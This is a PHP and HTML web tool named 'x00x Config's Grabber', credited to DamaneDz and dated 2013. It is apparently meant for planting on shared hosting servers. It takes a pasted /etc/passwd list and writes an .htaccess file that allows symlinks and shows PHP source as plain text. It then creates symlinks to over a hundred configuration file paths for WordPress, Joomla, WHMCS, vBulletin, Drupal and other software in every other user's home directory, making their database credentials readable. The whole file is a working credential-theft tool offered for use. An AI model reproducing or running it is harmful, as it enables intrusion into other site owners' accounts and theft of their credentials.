<html>
<head>
<title>x00x Config's Grabber By DamaneDz</title>
<style>
body{background-color:#808080;color:#FFF;align:center;font: 12pt Verdana;}
input[type=text],textarea,select,input[type=password],button,submit{border: 5px #404040 solid;background: #141414;
color: #FFF;font: 12pt Verdana;outline: none;border-radius: 5px;opacity:0.7;}
textarea{width: 525px; height: 301px;}
input[type=submit], .button, input[type=reset], button {background: #404040;color: #FFF;font: 12pt Verdana;outline: none;
opacity:1;filter:alpha(opacity=90); padding: 5px 8px !important;border: none !important;border-radius: 5px;}
.banner{color: #FFFFFF;background-color: #000000;font: 25pt Verdana;}
</style>
</head>
<body>
<center>
<div class="banner">x00x Config's Grabber By DamaneDz</div></br>
<p>&nbsp;</p>
<form method="POST">
Passwd File:
<p>&nbsp;</p>
<textarea name="passwd" ></textarea></br>
<p>&nbsp;</p>
<input name="cat" size="80" value="Start" type="submit"></br>
</form>
<?php

/*
This File Was Writed By DamaneDz.
 
Twitter:@DamaneDz
Email:Damane-Dz@hotmail.com
Skype:Damane2011

2013 Dz_Algeria
*/

@error_reporting(0);
@set_time_limit(0);

if($_POST["cat"] && !$_POST["passwd"]==""){
echo "Checking Functions ...<br>";
$functions=@ini_get("disable_functions");
if(eregi("symlink",$functions)){
die("<font color=red>Symlink Function is DisableD, You Can't Continue This Process !!</font>");
}
echo "Checking Done Without Problems, Continue ...<br>";
@mkdir("x00x_configs", 0755);
@chdir("x00x_configs");
$htaccess="
Options all
Options +Indexes
Options +Followsymlinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None 
Satisfy Any
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=$_POST["passwd"];
$passwd=explode("\n",$passwd);
echo "Start Symlinking ...<br>";
foreach($passwd as $pwd){
$pawd=explode(":",$pwd);
$user =$pawd[0];
// Now symlink Them
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-shop.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-shop-os.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-oscom.txt');
@symlink('/home2/'.$user.'/public_html/oscommerce/includes/configure.php',$user.'-oscommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscommerces/includes/configure.php',$user.'-oscommerces.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-shop2.txt');
@symlink('/home2/'.$user.'/public_html/shopping/includes/configure.php',$user.'-shop-shopping.txt');
@symlink('/home2/'.$user.'/public_html/sale/includes/configure.php',$user.'-sale.txt');
@symlink('/home2/'.$user.'/public_html/amember/config.inc.php',$user.'-amember.txt');
@symlink('/home2/'.$user.'/public_html/config.inc.php',$user.'-amember2.txt');
@symlink('/home2/'.$user.'/public_html/members/configuration.php',$user.'-members.txt');
@symlink('/home2/'.$user.'/public_html/config.php',$user.'-4images1.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-forum.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-forums.txt');
@symlink('/home2/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home2/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home2/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home2/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home2/'.$user.'/public_html/home2/wp-config.php',$user.'-wp-home2.txt');
@symlink('/home2/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home2/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');
@symlink('/home2/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home2/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home2/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home2/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home2/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home2/'.$user.'/public_html/home2/configuration.php',$user.'-joomla-home2.txt');
@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home2/'.$user.'/public_html/vb3/includes/config.php',$user.'-vb3-config.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-vb1-config.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-includes-vb.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.txt');
@symlink('/home2/'.$user.'/public_html/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
@symlink('/home2/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
@symlink('/home2/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home2/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
@symlink('/home2/'.$user.'/public_html/supp/configuration.php',$user.'-supp.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-sucure.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-sucure-whm.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-sucure-whmcs.txt');
@symlink('/home2/'.$user.'/public_html/cpanel/configuration.php',$user.'-cpanel.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-panel.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-host.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-hosting.txt');
@symlink('/home2/'.$user.'/public_html/hosts/configuration.php',$user.'-hosts.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-clients.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-client.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-clientes.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-client.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-clientsupport.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-billing.txt'); 
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-whm-manage.txt'); 
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-whm-my.txt'); 
@symlink('/home2/'.$user.'/public_html/myshop/configuration.php',$user.'-whm-myshop.txt'); 
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-zencart.txt'); 
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-shop-zencart.txt'); 
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-shop-ZCshop.txt'); 
@symlink('/home2/'.$user.'/public_html/Settings.php',$user.'-smf.txt'); 
@symlink('/home2/'.$user.'/public_html/smf/Settings.php',$user.'-smf2.txt'); 
@symlink('/home2/'.$user.'/public_html/forum/Settings.php',$user.'-smf-forum.txt'); 
@symlink('/home2/'.$user.'/public_html/forums/Settings.php',$user.'-smf-forums.txt'); 
@symlink('/home2/'.$user.'/public_html/upload/includes/config.php',$user.'-up.txt');
@symlink('/home2/'.$user.'/public_html/article/config.php',$user.'-Nwahy.txt'); 
@symlink('/home2/'.$user.'/public_html/up/includes/config.php',$user.'-up2.txt');
@symlink('/home2/'.$user.'/public_html/conf_global.php',$user.'-6.txt');
@symlink('/home2/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home2/'.$user.'/public_html/connect.php',$user.'-PHP-Fusion.txt');
@symlink('/home2/'.$user.'/public_html/mk_conf.php',$user.'-9.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-traidnt1.txt');
@symlink('/home2/'.$user.'/public_html/config.php',$user.'-4images.txt');
@symlink('/home2/'.$user.'/public_html/sites/default/settings.php',$user.'-Drupal.txt');
@symlink('/home2/'.$user.'/public_html/member/configuration.php',$user.'-1member.txt') ; 
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-billings.txt') ; 
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');
@symlink('/home2/'.$user.'/public_html/supports/configuration.php',$user.'-supports.txt');
@symlink('/home2/'.$user.'/public_html/requires/config.php',$user.'-AM4SS-hosting.txt');
@symlink('/home2/'.$user.'/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-hostbills-client.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-hostbills-support.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-hostbills-host.txt');
@symlink('/home2/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.txt');
@symlink('/home2/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.txt');
}
echo "DonE with Success --> <a href='x00x_configs'>Click Here</a><br>";
}
?>
<center>
<p align="center">&nbsp;</p>
<p align="center"><font color="#2C2C2C" size="4">By DamaneDz</font><br><br>
MaDe in AlGeria 2013 &copy</p>
<p></center>
</body>
</html>